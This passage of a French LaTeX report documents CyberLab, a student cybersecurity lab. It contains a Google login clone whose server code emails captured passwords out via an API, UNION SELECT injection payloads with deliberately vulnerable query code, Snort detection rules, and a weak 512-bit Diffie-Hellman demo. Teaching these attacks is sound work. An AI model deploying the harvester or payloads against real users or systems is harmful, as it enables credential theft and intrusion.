% ============================================================
%  Rapport CyberLab — Plateforme éducative de cybersécurité
%  Style : rapport académique noir & blanc
% ============================================================
\documentclass[12pt,a4paper]{report}

% ── Encodage & langue ────────────────────────────────────────
\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}
\usepackage[french]{babel}

% ── Mise en page ─────────────────────────────────────────────
\usepackage{geometry}
\geometry{top=2.5cm, bottom=2.5cm, left=3cm, right=2.5cm}
\usepackage{setspace}
\onehalfspacing
\usepackage{parskip}
\setlength{\parskip}{5pt}
\setlength{\parindent}{0pt}

% ── Police ───────────────────────────────────────────────────
\usepackage{lmodern}
\usepackage{microtype}

% ── En-têtes / pieds de page ──────────────────────────────────
\usepackage{fancyhdr}
\pagestyle{fancy}
\fancyhf{}
\renewcommand{\headrulewidth}{0.4pt}
\renewcommand{\footrulewidth}{0.4pt}
\fancyhead[L]{\small\textit{CyberLab — Rapport de projet}}
\fancyhead[R]{\small\textit{\leftmark}}
\fancyfoot[C]{\small\thepage}
\fancypagestyle{plain}{
  \fancyhf{}
  \renewcommand{\headrulewidth}{0pt}
  \renewcommand{\footrulewidth}{0.4pt}
  \fancyfoot[C]{\small\thepage}
}

% ── Listings (code source) ───────────────────────────────────
\usepackage{listings}
\usepackage{xcolor}
\lstset{
  backgroundcolor=\color{gray!6},
  basicstyle=\ttfamily\footnotesize,
  keywordstyle=\bfseries,
  stringstyle=\itshape,
  commentstyle=\itshape\color{gray!70!black},
  numberstyle=\tiny\color{gray},
  numbers=left,
  numbersep=10pt,
  frame=single,
  framerule=0.4pt,
  rulecolor=\color{gray!50},
  breaklines=true,
  breakatwhitespace=true,
  showstringspaces=false,
  tabsize=2,
  captionpos=b,
  xleftmargin=15pt,
  xrightmargin=5pt,
  aboveskip=10pt,
  belowskip=8pt
}
\lstdefinelanguage{JavaScript}{
  keywords={const,let,var,function,return,if,else,for,while,try,catch,
             require,module,exports,async,await,new,this,class,import,from},
  morestring=[b]",
  morestring=[b]',
  morestring=[b]`,
  morecomment=[l]{//},
  morecomment=[s]{/*}{*/}
}
\lstdefinelanguage{SQL}{
  keywords={SELECT,FROM,WHERE,INSERT,INTO,VALUES,UPDATE,SET,DELETE,
             UNION,ORDER,BY,AND,OR,NOT,LIKE,CREATE,TABLE,DROP,ALTER,
             JOIN,LEFT,RIGHT,INNER,ON,AS,DISTINCT,GROUP,HAVING,LIMIT},
  morestring=[b]',
  morecomment=[l]{--},
  morecomment=[s]{/*}{*/},
  sensitive=false
}

% ── Graphiques & tableaux ────────────────────────────────────
\usepackage{booktabs}
\usepackage{array}
\usepackage{tabularx}
\usepackage{multirow}
\newcolumntype{L}[1]{>{\raggedright\arraybackslash}p{#1}}
\newcolumntype{C}[1]{>{\centering\arraybackslash}p{#1}}
\usepackage{caption}
\captionsetup{font=small, labelfont=bf}

% ── TikZ ─────────────────────────────────────────────────────
\usepackage{tikz}
\usetikzlibrary{arrows.meta,shapes.geometric,positioning,calc}

% ── Boîtes encadrées ─────────────────────────────────────────
\usepackage{mdframed}
\newmdenv[
  linewidth=0.6pt,
  linecolor=black!40,
  backgroundcolor=gray!5,
  innertopmargin=8pt,
  innerbottommargin=8pt,
  innerleftmargin=12pt,
  innerrightmargin=12pt,
  skipabove=10pt,
  skipbelow=8pt
]{notebox}

\newmdenv[
  linewidth=0.8pt,
  linecolor=black!70,
  backgroundcolor=white,
  innertopmargin=8pt,
  innerbottommargin=8pt,
  innerleftmargin=12pt,
  innerrightmargin=12pt,
  skipabove=10pt,
  skipbelow=8pt
]{warnbox}

% ── Hyperliens (noir pour impression) ────────────────────────
\usepackage[colorlinks=false, hidelinks]{hyperref}

% ── Numérotation ─────────────────────────────────────────────
\setcounter{tocdepth}{2}
\setcounter{secnumdepth}{3}

% ── Commandes utilitaires ────────────────────────────────────
\newcommand{\code}[1]{\texttt{#1}}
\newcommand{\keyword}[1]{\textbf{#1}}

% ── Titre des chapitres ──────────────────────────────────────
\usepackage{titlesec}
\titleformat{\chapter}[block]
  {\normalfont\Large\bfseries}
  {\thechapter.}{12pt}{\Large}
  [\vspace{2pt}\hrule\vspace{4pt}]
\titlespacing{\chapter}{0pt}{20pt}{18pt}

% ============================================================
\begin{document}

% ── PAGE DE TITRE ─────────────────────────────────────────────
\begin{titlepage}
  \centering
  \vspace*{2cm}

  \rule{\textwidth}{1.5pt}\\[6pt]
  {\LARGE\bfseries CyberLab}\\[4pt]
  {\large Plateforme éducative de cybersécurité}\\[4pt]
  \rule{\textwidth}{0.8pt}

  \vspace{2cm}

  {\Huge\bfseries Rapport de Projet}

  \vspace{1.5cm}

  {\large
    Implémentation de quatre modules de sécurité offensifs et défensifs :\\[8pt]
    Phishing · SQL Injection · IDS/Snort · Cryptographie DH+AES
  }

  \vspace{2.5cm}

  \begin{tabular}{ll}
    \textbf{Auteur}         & Arslan D. \\[5pt]
    \textbf{Type}           & Projet académique de cybersécurité \\[5pt]
    \textbf{Technologies}   & Node.js, Express, SQLite, HTML/CSS/JS \\[5pt]
    \textbf{Déploiement}    & \url{https://cyberlab-uxey.onrender.com} \\[5pt]
    \textbf{Dépôt}          & \url{https://github.com/D-Arslan/Cyberlab} \\[5pt]
    \textbf{Date}           & Mai 2026 \\
  \end{tabular}

  \vfill

  \begin{notebox}
    \small\itshape
    Ce projet est réalisé exclusivement dans un cadre académique.
    Toutes les techniques présentées sont mises en œuvre dans un
    environnement isolé à des fins éducatives uniquement. Aucune
    utilisation malveillante n'est encouragée ni autorisée.
  \end{notebox}

\end{titlepage}

% ── RÉSUMÉ ────────────────────────────────────────────────────
\chapter*{Résumé}
\addcontentsline{toc}{chapter}{Résumé}

CyberLab est une plateforme web éducative de cybersécurité regroupant
plusieurs modules interactifs, chacun dédié à une famille d'attaques ou
de protocoles de sécurité. Le projet vise à fournir un environnement
d'apprentissage pratique et légal pour comprendre les techniques offensives
et les contre-mesures associées.

Ce rapport documente la conception, l'implémentation et le déploiement de
quatre modules développés dans le cadre de ce projet :
\begin{itemize}
  \item \textbf{Phishing} : reproduction d'une page de connexion Google
        avec capture d'identifiants et page de sensibilisation.
  \item \textbf{SQL Injection} : boutique fictive vulnérable avec mode guidé
        (5 challenges progressifs) et mode libre.
  \item \textbf{IDS Simulator} : simulateur de système de détection d'intrusion
        avec moteur de règles Snort et tableau de bord temps réel.
  \item \textbf{Cryptographie DH+AES} : implémentation d'un protocole de
        communication sécurisée combinant l'échange de clés Diffie-Hellman
        et le chiffrement AES-256-CBC.
\end{itemize}

L'ensemble est intégré dans une architecture Node.js modulaire, déployée
en continu sur la plateforme Render.

\vspace{1cm}
\textbf{Mots-clés :} cybersécurité, phishing, injection SQL, IDS, Snort,
Diffie-Hellman, AES, Node.js, plateforme éducative.

% ── TABLE DES MATIÈRES ────────────────────────────────────────
\tableofcontents
\clearpage

% ── LISTE DES FIGURES ─────────────────────────────────────────
\listoffigures
\addcontentsline{toc}{chapter}{Liste des figures}
\clearpage

% ============================================================
\chapter{Introduction générale}
% ============================================================

\section{Contexte et motivation}

La cybersécurité est l'un des domaines les plus critiques de l'informatique
moderne. Comprendre les techniques d'attaque est indispensable pour concevoir
des systèmes robustes et former des professionnels compétents. Or, il est
difficile d'apprendre ces techniques de manière pratique sans un environnement
contrôlé et légal.

\keyword{CyberLab} est une réponse à ce besoin : une plateforme éducative
web regroupant plusieurs modules interactifs, chacun dédié à une famille
d'attaques ou de protocoles de sécurité. Chaque module propose une approche
pédagogique en deux volets : l'\textit{exploration offensive} (comprendre
comment l'attaque fonctionne) et la \textit{défense} (comprendre comment
s'en protéger).

\section{Objectifs du projet}

\begin{itemize}
  \item Implémenter des scénarios d'attaque réels dans un cadre contrôlé
  \item Fournir une interface interactive et visuelle pour l'apprentissage
  \item Regrouper plusieurs modules dans une plateforme unifiée et déployée en ligne
  \item Illustrer les bonnes pratiques de sécurité à travers la comparaison
        code vulnérable / code sécurisé
  \item Déployer la plateforme en production pour des démonstrations réelles
\end{itemize}

\section{Modules développés}

Quatre modules ont été implémentés dans le cadre de ce projet :

\begin{center}
\begin{tabular}{C{1.2cm} L{3.5cm} L{7.5cm}}
  \toprule
  \textbf{\#} & \textbf{Module} & \textbf{Thème} \\
  \midrule
  1 & Phishing        & Ingénierie sociale, capture d'identifiants, sensibilisation \\
  2 & SQL Injection   & Injection SQL, exfiltration de données, prévention \\
  3 & IDS Simulator   & Détection d'intrusion réseau, règles Snort \\
  4 & SecureLink      & Échange de clés Diffie-Hellman, chiffrement AES-256 \\
  \bottomrule
\end{tabular}
\end{center}

\section{Structure du rapport}

Le rapport est organisé comme suit. Le chapitre 2 présente l'architecture
globale de la plateforme CyberLab. Les chapitres 3 à 6 détaillent chacun
des quatre modules. Le chapitre 7 traite de l'intégration et du déploiement.
Le chapitre 8 dresse un bilan et présente les perspectives d'évolution.

% ============================================================
\chapter{Architecture globale de CyberLab}
% ============================================================

\section{Stack technique}

CyberLab repose sur une stack volontairement minimaliste pour faciliter
le déploiement, la maintenance et la compréhension du code source.

\begin{center}
\begin{tabular}{L{3.5cm} L{3.5cm} L{6cm}}
  \toprule
  \textbf{Couche} & \textbf{Technologie} & \textbf{Rôle} \\
  \midrule
  Backend         & Node.js + Express    & Serveur HTTP, routage modulaire \\
  Frontend        & HTML / CSS / JS pur  & Interfaces sans framework \\
  Base de données & better-sqlite3       & SQLite in-memory (module SQLi) \\
  Email           & Resend API (HTTPS)   & Envoi d'emails via API REST \\
  Cryptographie   & Module \code{crypto} natif & DH, AES-CBC, SHA-256 \\
  Déploiement     & Render (plan gratuit) & Hébergement cloud \\
  Versioning      & Git + GitHub         & Gestion du code source \\
  \bottomrule
\end{tabular}
\end{center}

\begin{notebox}
  \textbf{Choix Resend au lieu de Nodemailer/SMTP.}
  La plateforme Render bloque les ports SMTP (465 et 587). L'API Resend
  fonctionne via HTTPS (port 443), contournant cette contrainte.
  Un seul appel HTTP suffit pour envoyer un email formaté en HTML.
\end{notebox}

\section{Architecture modulaire}

Chaque module est totalement autonome : il possède son propre dossier
\code{modules/<nom>/} contenant ses routes Express et ses fichiers statiques.
Le fichier \code{server.js} central les charge tous au démarrage :

\begin{lstlisting}[language=JavaScript, caption={Point d'entrée — chargement de tous les modules}]
require('dotenv').config();
const express = require('express');
const path    = require('path');
const app     = express();
const PORT    = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

require('./modules/phishing/routes')(app);
require('./modules/sqli/routes')(app);
require('./modules/ids/routes')(app);
require('./modules/crypto/routes')(app);

app.listen(PORT, () =>
  console.log(`CyberLab démarré sur http://localhost:${PORT}`)
);
\end{lstlisting}

\section{Structure des répertoires}

\begin{lstlisting}[numbers=none, caption={Arborescence complète du projet}]
CyberLab/
|-- server.js              % Point d'entree
|-- package.json
|-- .env                   % Variables d'environnement (non commite)
|-- public/
|   `-- index.html         % Landing page (hub des modules)
`-- modules/
    |-- phishing/
    |   |-- routes.js
    |   `-- public/        % Clone Google + page de sensibilisation
    |-- sqli/
    |   |-- db.js          % SQLite in-memory
    |   |-- routes.js
    |   `-- public/        % CyberShop + login + admin + education
    |-- ids/
    |   |-- engine.js      % Moteur de regles Snort
    |   |-- traffic.js     % Generateur de trafic simule
    |   |-- routes.js
    |   `-- public/        % Challenge + monitor + education
    `-- crypto/
        |-- routes.js      % DH keygen, compute, AES encrypt/decrypt
        `-- public/        % Demo interactive + education
\end{lstlisting}

\section{Pattern d'intégration des modules}

Tous les modules suivent le même pattern : une fonction exportée qui
reçoit l'instance Express en paramètre, enregistre les fichiers statiques
et définit les routes API.

\begin{lstlisting}[language=JavaScript, caption={Pattern uniforme de chaque module (exemple : crypto)}]
const path    = require('path');
const express = require('express');

module.exports = function (app) {
  // Fichiers statiques accessibles sous /crypto/
  app.use('/crypto', express.static(path.join(__dirname, 'public')));

  // Routes API sous /crypto/api/
  app.post('/crypto/api/dh/keygen',   (req, res) => { /* ... */ });
  app.post('/crypto/api/aes/encrypt', (req, res) => { /* ... */ });
};
\end{lstlisting}

Cette architecture permet d'ajouter un nouveau module en une seule ligne
dans \code{server.js}, sans modifier le code existant.

% ============================================================
\chapter{Module 1 — Phishing}
% ============================================================

\section{Présentation}

Le module phishing reproduit une attaque d'ingénierie sociale classique :
la création d'un clone d'une page de connexion légitime (Google) afin de
capturer les identifiants d'un utilisateur. L'objectif pédagogique est
double : comprendre le fonctionnement de cette attaque, et apprendre à
s'en protéger grâce à la page de sensibilisation.

\section{Flux de l'attaque}

\begin{figure}[h]
\centering
\begin{tikzpicture}[
  box/.style={draw, rounded corners=3pt, minimum width=2.5cm,
              minimum height=0.8cm, font=\small, align=center,
              fill=white},
  arrow/.style={-Latex, thick},
  label/.style={font=\scriptsize, midway}
]
  \node[box] (att) at (0,0)    {Attaquant};
  \node[box] (vic) at (5.5,0)  {Victime};
  \node[box] (srv) at (11,0)   {Serveur};

  \draw[arrow] (att) -- node[above, label]{1. Envoie le lien piégé} (vic);
  \draw[arrow] (vic) -- node[above, label]{2. Ouvre la page} (srv);
  \draw[arrow] (srv) to[bend right=15] node[below, label]{3. Clone Google affiché} (vic);
  \draw[arrow] (vic) to[bend right=20] node[above, label]{4. Saisit email + mot de passe} (srv);
  \draw[arrow] (srv) to[bend left=30]  node[below, label]{5. Email → attaquant (Resend API)} (att);
  \draw[arrow] (srv) to[bend right=35] node[below, label]{6. Redirection sensibilisation} (vic);
\end{tikzpicture}
\caption{Flux complet d'une attaque de phishing}
\end{figure}

\section{Clone de la page Google}

La page reproduit fidèlement l'interface de connexion Google avec un flux
en deux étapes.

\begin{center}
\begin{tabular}{L{4cm} L{9cm}}
  \toprule
  \textbf{Élément} & \textbf{Implémentation} \\
  \midrule
  Logo Google    & \code{<span>} CSS colorés lettre par lettre \\
                 & (\#4285F4, \#EA4335, \#FBBC05, \#34A853) \\
  Labels flottants & Transition CSS \code{transform: translateY} \\
  Validation     & Messages d'erreur identiques à Google \\
  Animation      & \code{fadeIn + translateX} entre les deux étapes \\
  Favicon        & Favicon Google officiel \\
  Responsive     & Media queries pour adaptation mobile \\
  \bottomrule
\end{tabular}
\end{center}

\begin{notebox}
  \textbf{Note d'implémentation — Logo Google.}
  Le rendu d'un SVG Google était incorrect sur certains navigateurs.
  La solution retenue est de coder chaque lettre dans un \code{<span>}
  avec la couleur CSS officielle correspondante.
\end{notebox}

\section{Capture et exfiltration}

Lors de la soumission du formulaire, une requête \code{POST /phishing/submit}
est émise vers le serveur. Celui-ci extrait les données et les transmet
par email via l'API Resend.

\begin{lstlisting}[language=JavaScript, caption={Capture des identifiants et envoi par email}]
app.post('/phishing/submit', async (req, res) => {
  const { email, password } = req.body;
  const ip   = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const date = new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' });

  await fetch('https://api.resend.com/emails', {
    method: 'POST',
    headers: {
      'Authorization': `Bearer ${process.env.RESEND_API_KEY}`,
      'Content-Type':  'application/json'
    },
    body: JSON.stringify({
      from:    'phishing@cyberlab.dev',
      to:      process.env.EMAIL_TO,
      subject: '[CyberLab] Identifiants capturés',
      html:    `<b>Email :</b> ${email}<br>
                <b>Mot de passe :</b> ${password}<br>
                <b>IP :</b> ${ip}<br>
                <b>Date :</b> ${date}`
    })
  });

  res.json({ success: true });
});
\end{lstlisting}

Les données capturées sont : l'email, le mot de passe, l'adresse IP
(via le header \code{x-forwarded-for}), et l'horodatage.

\section{Page de sensibilisation}

Après la capture, l'utilisateur est redirigé vers \code{awareness.html}
qui lui explique qu'il vient d'être victime d'une simulation de phishing,
détaille les 4 étapes de l'attaque qui s'est déroulée, et lui fournit
une checklist de protection :
vérifier l'URL, activer le 2FA, utiliser un gestionnaire de mots de passe,
accéder aux sites en tapant l'URL manuellement.

\section{Aspects légaux}

\begin{warnbox}
  \textbf{Cadre légal.}
  Le phishing est un délit puni par l'article 226-4-1 du Code pénal.
  Ce module est utilisé \textbf{exclusivement en contexte académique}.
  Les identifiants capturés sont transmis uniquement à l'adresse email
  du propriétaire du laboratoire et ne sont pas conservés.
\end{warnbox}

% ============================================================
\chapter{Module 2 — SQL Injection}
% ============================================================

\section{Présentation}

Le module SQL Injection est un laboratoire interactif reproduisant une
fausse boutique en ligne (\textbf{CyberShop}) volontairement vulnérable.
Deux modes sont proposés : un \textit{mode guidé} avec 5 challenges
progressifs reproduisant la méthodologie réelle d'un attaquant, et un
\textit{mode libre} pour tester ses connaissances sans assistance.

\section{Base de données SQLite in-memory}

La base de données est créée en mémoire à chaque démarrage du serveur
(module \code{better-sqlite3}), garantissant un environnement propre
et sans persistance de données réelles.

\begin{center}
\begin{tabular}{L{3cm} L{4cm} L{6.5cm}}
  \toprule
  \textbf{Table} & \textbf{Colonnes principales} & \textbf{Contenu} \\
  \midrule
  \code{products}
    & id, name, description, price, category, stock
    & 12 produits tech fictifs \\[4pt]
  \code{users}
    & id, username, password, email, role
    & 3 utilisateurs dont admin, mots de passe en clair \\[4pt]
  \code{secret\_data}
    & id, flag, description
    & 3 flags CTF à découvrir via injection \\
  \bottomrule
\end{tabular}
\end{center}

Les mots de passe sont stockés en clair intentionnellement pour illustrer
cette mauvaise pratique et permettre leur récupération via UNION SELECT.

\section{Code vulnérable et code sécurisé}

La différence fondamentale entre une route vulnérable et une route sécurisée
est la manière dont l'entrée utilisateur est traitée.

\begin{lstlisting}[language=JavaScript, caption={Route vulnérable — concaténation directe}]
// VULNERABLE : l'entree utilisateur est inseree comme du code SQL
app.get('/sqli/api/search', (req, res) => {
  const query = req.query.q;
  const sql   = `SELECT * FROM products
                 WHERE name LIKE '%${query}%'
                 OR description LIKE '%${query}%'`;
  const results = db.prepare(sql).all();
  res.json({ results, sql }); // La requete SQL est aussi renvoyee
});
\end{lstlisting}

\begin{lstlisting}[language=JavaScript, caption={Route sécurisée — requête paramétrée}]
// SECURISE : la valeur est traitee comme une donnee, jamais comme du code
app.get('/sqli/api/search-safe', (req, res) => {
  const query = req.query.q;
  const param = `%${query}%`;
  const sql   = `SELECT * FROM products
                 WHERE name LIKE ?
                 OR description LIKE ?`;
  const results = db.prepare(sql).all(param, param);
  res.json({ results });
});
\end{lstlisting}

Dans la version sécurisée, la base de données reçoit la requête et la
valeur séparément via des \textit{prepared statements}. L'entrée
utilisateur ne peut jamais être interprétée comme du code SQL.

\section{Les 5 challenges du mode guidé}

Les challenges reproduisent la méthodologie réelle d'un attaquant,
étape par étape, de la détection de la vulnérabilité jusqu'à l'extraction
de données confidentielles.

\begin{center}
\begin{tabular}{C{0.6cm} L{3.2cm} L{4.5cm} L{4.5cm}}
  \toprule
  \textbf{\#} & \textbf{Objectif} & \textbf{Injection} & \textbf{Résultat attendu} \\
  \midrule
  1 & Détecter la faille
    & \code{'}
    & Erreur SQL — faille confirmée \\[4pt]
  2 & Contourner les filtres
    & \code{' OR 1=1 --}
    & Tous les produits affichés \\[4pt]
  3 & Compter les colonnes
    & \code{' ORDER BY 6 --}
    & 6 colonnes identifiées \\[4pt]
  4 & Exfiltrer les utilisateurs
    & \code{' UNION SELECT 1,username,password,email,role,6 FROM users --}
    & Identifiants récupérés \\[4pt]
  5 & Cartographier la BDD
    & \code{' UNION SELECT 1,name,sql,3,4,5 FROM sqlite\_master --}
    & Structure complète + flags CTF \\
  \bottomrule
\end{tabular}
\end{center}

\subsection{Challenge 4 — Exfiltration par UNION SELECT}

\begin{lstlisting}[language=SQL, caption={Requête générée par l'injection du challenge 4}]
SELECT * FROM products
WHERE name LIKE '%'
UNION SELECT 1, username, password, email, role, 6 FROM users --'%'
\end{lstlisting}

La clause \code{UNION SELECT} fusionne les résultats de deux requêtes.
Le nombre de colonnes doit être identique (6 colonnes, déterminé au
challenge 3). Les valeurs \code{1} et \code{6} sont des placeholders
pour correspondre aux colonnes de la première requête.

\subsection{Challenge 5 — Cartographie via sqlite\_master}

\begin{lstlisting}[language=SQL, caption={Lecture du schéma de la base de données}]
SELECT * FROM products
WHERE name LIKE '%'
UNION SELECT 1, name, sql, 3, 4, 5 FROM sqlite_master --'%'
\end_lstlisting}
\end{lstlisting}

\code{sqlite\_master} est une table système de SQLite contenant la
définition (\code{CREATE TABLE}) de toutes les tables. L'attaquant
y découvre l'existence de \code{secret\_data}, puis l'interroge pour
extraire les flags CTF.

\section{Prévention}

\begin{enumerate}
  \item \textbf{Prepared statements} (défense principale) : séparation
        requête/données, rendu impossible de l'injection
  \item Utilisation d'un ORM (Sequelize, Prisma, SQLAlchemy)
  \item Validation et assainissement des entrées utilisateur
  \item Principe du moindre privilège sur la base de données
  \item Ne jamais exposer les messages d'erreur SQL en production
\end{enumerate}

\section{Aspects légaux}

\begin{warnbox}
  \textbf{Cadre légal.}
  L'injection SQL est punissable par l'article 323-1 du Code pénal
  (accès frauduleux à un système de traitement automatisé de données) :
  jusqu'à 5 ans d'emprisonnement et 150\,000 € d'amende.
  Ce module utilise une base de données fictive en mémoire.
\end{warnbox}

% ============================================================
\chapter{Module 3 — IDS Simulator (CyberGuard)}
% ============================================================

\section{Présentation}

\textbf{CyberGuard} est un simulateur de système de détection d'intrusion
(IDS) web-based. L'utilisateur écrit des règles au format \textbf{Snort}
et les teste contre du trafic réseau simulé. Trois modes sont disponibles :
mode guidé (5 challenges progressifs), monitor temps réel, et une page
éducative sur la théorie des IDS.

\section{Anatomie d'une règle Snort}

Une règle Snort se compose d'une action, d'un protocole, d'adresses et
ports source/destination, et d'un ensemble d'options entre parenthèses.

\begin{lstlisting}[numbers=none, caption={Format d'une règle Snort}]
alert tcp 192.168.1.0/24 any -> any 22 (msg:"SSH Brute Force"; content:"SSH"; flags:S; sid:1001;)
\end{lstlisting}

\begin{center}
\begin{tabular}{L{3cm} L{9.5cm}}
  \toprule
  \textbf{Champ} & \textbf{Description} \\
  \midrule
  \code{alert}           & Action déclenchée si la règle correspond \\
  \code{tcp}             & Protocole réseau (tcp, udp, icmp, any) \\
  \code{192.168.1.0/24}  & Adresse IP source (supporte CIDR et \code{any}) \\
  \code{any} (src port)  & Port source \\
  \code{any} (dst IP)    & Adresse IP de destination \\
  \code{22}              & Port de destination \\
  \code{msg:"..."}       & Message de l'alerte \\
  \code{content:"..."}   & Sous-chaîne à rechercher dans le payload \\
  \code{flags:S}         & Flag TCP à vérifier (SYN, ACK, FIN...) \\
  \code{sid:1001}        & Identifiant unique de la règle \\
  \bottomrule
\end{tabular}
\end{center}

\section{Moteur de règles (engine.js)}

Le moteur parse les règles Snort et les applique à chaque paquet du
trafic simulé. Le matching est séquentiel : protocole → IP → ports →
contenu du payload → flags TCP.

\begin{lstlisting}[language=JavaScript, caption={Algorithme de matching d'une règle Snort}]
function matchRule(rule, packet) {
  // 1. Verification du protocole
  if (rule.proto !== 'any' && rule.proto !== packet.proto) return false;

  // 2. Verification des adresses IP (supporte CIDR ex: 192.168.1.0/24)
  if (rule.srcIp !== 'any' && !matchIP(rule.srcIp, packet.src)) return false;
  if (rule.dstIp !== 'any' && !matchIP(rule.dstIp, packet.dst)) return false;

  // 3. Verification des ports
  if (rule.srcPort !== 'any' && rule.srcPort !== packet.srcPort) return false;
  if (rule.dstPort !== 'any' && rule.dstPort !== packet.dstPort) return false;

  // 4. Recherche de sous-chaine dans le payload
  if (rule.content && !packet.payload.includes(rule.content)) return false;

  // 5. Verification des flags TCP
  if (rule.flags && rule.flags !== packet.flags) return false;

  return true; // Toutes les conditions satisfaites -> ALERTE
}
\end{lstlisting}

\section{Générateur de trafic simulé (traffic.js)}

\begin{center}
\begin{tabular}{L{3.5cm} L{3cm} L{6.5cm}}
  \toprule
  \textbf{Type de trafic} & \textbf{Catégorie} & \textbf{Description} \\
  \midrule
  HTTP/HTTPS, DNS, SMB    & Normal  & Requêtes réseau standard \\
  DHCP, NTP, SMTP         & Normal  & Protocoles de services \\
  Ping Flood              & Attaque & Rafale de paquets ICMP vers une cible \\
  Port Scan               & Attaque & Paquets SYN vers ports 22, 80, 443, 3306 \\
  SQL Injection           & Attaque & Payload contenant \code{UNION SELECT} \\
  SSH Brute Force         & Attaque & Tentatives répétées sur le port 22 \\
  DNS Exfiltration        & Attaque & Sous-domaines encodés anormalement longs \\
  \bottomrule
\end{tabular}
\end{center}

\section{Les 5 challenges du mode guidé}

\begin{center}
\begin{tabular}{C{0.5cm} L{3.5cm} L{8.5cm}}
  \toprule
  \textbf{\#} & \textbf{Thème} & \textbf{Règle attendue} \\
  \midrule
  1 & Ping Flood
    & \code{alert icmp any any -> any any (msg:"Ping Flood"; sid:1;)} \\[4pt]
  2 & Port Scan
    & \code{alert tcp any any -> any any (msg:"Port Scan"; flags:S; sid:2;)} \\[4pt]
  3 & SQL Injection
    & \code{alert tcp any any -> any 80 (msg:"SQLi"; content:"UNION"; sid:3;)} \\[4pt]
  4 & SSH Brute Force
    & \code{alert tcp any any -> any 22 (msg:"SSH BF"; content:"SSH"; sid:4;)} \\[4pt]
  5 & DNS Exfiltration
    & \code{alert udp any any -> any 53 (msg:"DNS Exfil"; content:"exfil"; sid:5;)} \\
  \bottomrule
\end{tabular}
\end{center}

\section{Mode Monitor — Dashboard temps réel}

\begin{figure}[h]
\centering
\begin{tikzpicture}[
  block/.style={draw, rounded corners=3pt, minimum width=3cm,
                minimum height=0.85cm, font=\small, align=center, fill=white},
  arrow/.style={-Latex, thick}
]
  \node[block] (gen)  {Générateur\\de trafic};
  \node[block, right=2cm of gen]  (eng)  {Moteur Snort\\(engine.js)};
  \node[block, right=2cm of eng]  (ui)   {Dashboard\\(monitor.html)};
  \node[block, above=1.2cm of eng] (rule) {Règles\\utilisateur};

  \draw[arrow] (gen)  -- (eng)  node[midway, above, font=\scriptsize]{paquets};
  \draw[arrow] (rule) -- (eng)  node[midway, right, font=\scriptsize]{parse};
  \draw[arrow] (eng)  -- (ui)   node[midway, above, font=\scriptsize]{alertes};
\end{tikzpicture}
\caption{Pipeline du mode Monitor}
\end{figure}

Le dashboard génère du trafic toutes les 2 secondes et l'affiche en
temps réel. Un score comptabilise les vraies détections (vrais positifs)
et les faux positifs, permettant d'affiner les règles.

% ============================================================
\chapter{Module 4 — Cryptographie DH + AES (SecureLink)}
% ============================================================

\section{Présentation}

\textbf{SecureLink} implémente un protocole de communication sécurisée
combinant l'échange de clés \textbf{Diffie-Hellman} et le chiffrement
symétrique \textbf{AES-256-CBC}. L'objectif est de montrer concrètement
comment deux parties peuvent s'accorder sur un secret partagé via un
canal public, sans jamais l'avoir échangé directement.

\section{Partie 1 — Échange de clés Diffie-Hellman}

\subsection{Fondements mathématiques}

L'échange de clés DH, proposé par Whitfield Diffie et Martin Hellman
en 1976~\cite{diffie1976}, repose sur la difficulté du
\textbf{problème du logarithme discret} : connaissant $g$, $p$ et
$A = g^a \bmod p$, il est computationnellement infaisable de retrouver
$a$ pour des valeurs de $p$ suffisamment grandes (2048 bits minimum
en production).

\textbf{Protocole :}
\begin{enumerate}
  \item Paramètres publics : $p$ (grand nombre premier), $g$ (générateur)
  \item Alice choisit un entier secret $a$, calcule $A = g^a \bmod p$
  \item Bob choisit un entier secret $b$, calcule $B = g^b \bmod p$
  \item Alice et Bob échangent $A$ et $B$ sur le canal public
  \item Alice calcule $S = B^a \bmod p = g^{ab} \bmod p$
  \item Bob calcule $S = A^b \bmod p = g^{ab} \bmod p$
  \item Les deux secrets sont identiques — canal sécurisé établi
\end{enumerate}

La propriété clé est :
$$(g^a \bmod p)^b \bmod p \;=\; g^{ab} \bmod p \;=\; (g^b \bmod p)^a \bmod p$$

\subsubsection{Exemple numérique ($p=23$, $g=5$)}

\begin{center}
\begin{tabular}{L{6cm} L{6.5cm}}
  \toprule
  \textbf{Alice ($a = 6$)} & \textbf{Bob ($b = 15$)} \\
  \midrule
  $A = 5^6 \bmod 23 = 8$       & $B = 5^{15} \bmod 23 = 19$ \\[4pt]
  Reçoit $B = 19$              & Reçoit $A = 8$ \\[4pt]
  $S = 19^6 \bmod 23 = \mathbf{2}$ & $S = 8^{15} \bmod 23 = \mathbf{2}$ \\
  \bottomrule
\end{tabular}
\end{center}

\subsection{Implémentation Node.js}

\begin{lstlisting}[language=JavaScript, caption={Génération d'une paire de clés DH — routes.js}]
app.post('/crypto/api/dh/keygen', (req, res) => {
  const { prime, generator } = req.body;
  let dh;

  if (prime && generator) {
    // Bob reutilise les parametres d'Alice
    dh = crypto.createDiffieHellman(
      Buffer.from(prime,     'hex'),
      Buffer.from(generator, 'hex')
    );
  } else {
    // Alice genere un nouveau groupe DH 512 bits
    dh = crypto.createDiffieHellman(512);
  }

  dh.generateKeys();
  const sessionId = crypto.randomBytes(8).toString('hex');
  sessions.set(sessionId, { dh, createdAt: Date.now() });

  res.json({
    success:    true,
    sessionId,
    publicKey:  dh.getPublicKey('hex'),
    privateKey: dh.getPrivateKey('hex'), // expose a titre educatif
    prime:      dh.getPrime('hex'),
    generator:  dh.getGenerator('hex')
  });
});
\end{lstlisting}

\begin{lstlisting}[language=JavaScript, caption={Calcul du secret partagé — routes.js}]
app.post('/crypto/api/dh/compute', (req, res) => {
  const { sessionId, otherPublicKey } = req.body;
  const session = sessions.get(sessionId);

  // computeSecret() calcule g^(ab) mod p
  const sharedSecret = session.dh.computeSecret(
    Buffer.from(otherPublicKey, 'hex')
  );

  // Derivation de la cle AES via SHA-256 (256 bits)
  const aesKey = crypto.createHash('sha256')
                       .update(sharedSecret)
                       .digest('hex');

  res.json({
    success: true,
    sharedSecret: sharedSecret.toString('hex'),
    aesKey
  });
});
\end{lstlisting}

\section{Partie 2 — Dérivation de la clé AES}

Le secret partagé DH est un entier de taille variable. Pour l'utiliser
avec AES, il doit être transformé en une clé de taille fixe via une
\textbf{fonction de dérivation de clé (KDF)}.

On applique SHA-256 sur le secret partagé, ce qui produit exactement
